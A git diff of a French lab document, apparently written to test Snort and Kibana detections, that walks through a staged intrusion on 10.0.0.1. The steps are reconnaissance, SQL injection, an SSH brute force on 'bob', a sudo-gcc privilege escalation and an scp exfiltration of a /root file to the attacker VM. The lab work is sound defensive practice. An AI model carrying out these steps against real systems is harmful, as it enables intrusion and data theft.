@@ -1,21 +1,21 @@
 
 # Scénarios d'attaque
 
-## Attaque 1 - Ping et Scan de ports
+## Attaque 1 - Ping de la cible
 
 L’attaquant étant déjà sur le réseau, il a déjà sondé ce dernier afin de découvrir quels sont les appareils présents. Son attention se porte sur un serveur web dont il scanne les ports. Le balayage de ports permet de récupérer beaucoup d’informations sur la cible, notamment ses ports ouverts.
 
-### Attaque 1.1
 Tout d'abord, pour vérifier si le serveur qu'il veut attaquer est actif, il va pouvoir effectuer un ping comme suit :
 
 `ping 10.0.0.1`
 
 Pour le MITRE, cela correspond dans la phase Reconnaissance à Active Scanning (https://attack.mitre.org/techniques/T1595), un ping sert à découvrir les hôtes vivants, c’est un scan actif qui peut laisser des traces sur le réseau et dans les logs.
 
-Une alerte est attendue.
+Une alerte de cette forme est attendue sur Kibana :
+![Alerte Ping](Images/ping.png)
 
 
-## Attaque 1.2
+## Attaque 2 - Scan de ports
 
 L’outil utilisé ici est **nmap**, un scanner de ports qui permet d’avoir une meilleure idée de la surface d’attaque disponible sur le serveur web.
 
@@ -28,10 +28,11 @@ L’attaque se réalise comme ceci à partir de la VM de l’attaquant :
 
 Pour le MITRE, cela correspond dans la phase Reconnaissance au Active Scanning (https://attack.mitre.org/techniques/T1595), on scanne activement une machine et cela peut laisser des traces, c’est plus visible qu’une sonde, mais récolte beaucoup plus d’informations. 
 
-Une alerte est attendue.
+Une alerte de cette forme est attendue sur Kibana :
+![Alerte Nmap](Images/scan.png)
 
 
-## Attaque 2 - Récupération des noms utilisateurs par injection SQL
+## Attaque 3 - Récupération des noms utilisateurs par injection SQL
 
 Le service SSH étant inutilisable pour l’instant, l’attaquant se concentre sur l’application web publique hébergée sur le serveur. Il s’agit d’un outil interne permettant aux employés de trouver le contact des autres en donnant leur nom. Coup de chance, l’application est vulnérable : elle est susceptible d’accepter des requêtes non vérifiées vers la base de données. En exploitant une vulnérabilité d’injection SQL, il interroge donc la base MariaDB pour lister tous les employés et récupérer au moins un nom d’utilisateur utilisable pour les étapes ultérieures. 
 
@@ -42,7 +43,7 @@ L’outil utilisé sera le navigateur web Firefox (installé par défaut avec De
 
 L’attaque se réalise comme ceci à partir de la VM de l’attaquant : 
 
-Naviguez vers http://10.0.0.1/index.php
+Naviguez vers http://10.0.0.1/index.php avec Firefox
 
 Effectuez l’injection SQL suivante dans le formulaire web : 
 
@@ -50,9 +51,10 @@ Effectuez l’injection SQL suivante dans le formulaire web :
 
 Cela devrait retourner la liste complète des employés de l’entreprise en prenant avantage du code php vulnérable du serveur. Parmi ceux-ci, l’attaquant remarque **bob**, développeur web. Il a probablement travaillé sur ce serveur, et il vaut donc le coup de s’intéresser à son accès.
 
-Une alerte est attendue.
+Une alerte de cette forme est attendue sur Kibana :
+![Alerte SQLi](Images/sqli.png)
 
-## Attaque 3 - Brute-force sur un utilisateur
+## Attaque 4 - Brute-force sur un utilisateur
 
 Après identification d’un nom d’utilisateur valide (‘bob’), qui signifie qu’il existe très probablement un utilisateur bob dans le serveur web, l’attaquant lance une attaque par dictionnaire contre le service SSH de la machine vulnérable afin d’obtenir une session authentifiée avec accès au shell. 
 
@@ -75,9 +77,10 @@ Il semblerait donc que bob utilise un mot de passe beaucoup trop faible (‘pass
 
 `ssh bob@10.0.0.1`
 
-Une alerte est attendue.
+Une alerte de cette forme est attendue sur Kibana :
+![Alerte BruteForce](Images/bruteforce.png)
 
-## Attaque 4 - Escalade de privilège sur le serveur 
+## Attaque Bonus - Escalade de privilège sur le serveur
 
 Une fois connecté en tant que bob, l’attaquant se rend compte qu’il ne possède pas les permissions nécessaires pour pouvoir accéder à l’ensemble des fichiers du serveur. En revanche, de par son statut de développeur, bob possède certains privilèges. L’attaquant exécute `sudo -l` et voit que bob peut utiliser le compilateur **gcc** en tant que root. 
 
@@ -94,7 +97,7 @@ Cette commande permet de garder les privilèges obtenus en utilisant gcc pour ex
 
 En faisant whoami, cela devrait renvoyer root. L’attaquant a donc un accès total au serveur web.
 
-Une alerte est attendue.
+Une alerte n'est pas attendue pour cette attaque bonus, car snort se concentre sur la détection d'attaques réseau et non sur les actions post-exploitation au sein du système compromis. Une future amélioration de notre projet pourrait inclure des outils spécifiques pour détecter les escalades de privilèges locales.
 
 ## Attaque 5 - Exfiltration de données
 
@@ -109,9 +112,11 @@ L’attaque se réalise comme ceci :
 
 `scp /root/next_prime_minister_of_canada.jpg debian@10.0.0.3:/home/debian` 
 
-Puis se connecter en donnant le mot de passe de la VM attaquant.
+Puis se connecter en donnant le mot de passe de la VM attaquant ('debian').
 
 Si tout s’est bien passé, l’image devrait être accessible sur la VM attaquant, et nous vous laissons découvrir ce fichier primordial pour la sécurité du Canada.
 
-Une alerte est attendue.
+Une alerte de cette forme est attendue sur Kibana :
+![Alerte Exfiltration](Images/exfiltration.png)
+
 
